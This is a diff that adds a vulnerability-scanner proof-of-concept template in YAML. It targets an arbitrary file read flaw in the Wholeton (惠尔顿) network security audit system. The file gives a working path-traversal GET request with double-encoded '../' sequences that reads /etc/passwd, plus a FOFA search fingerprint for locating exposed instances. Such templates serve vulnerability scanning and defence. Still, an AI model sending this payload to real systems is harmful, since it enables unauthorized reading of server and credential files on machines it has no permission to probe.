@@ -1,0 +1,15 @@
+id: poc-yaml-wholeton-network-security-audit-system-anyfile-read
+info:
+  name: 惠尔顿网络安全审计系统 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 惠尔顿网络安全审计系统
+  fofa: app="惠尔顿-网络安全审计系统"
+requests:
+- method: GET
+  path: /download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
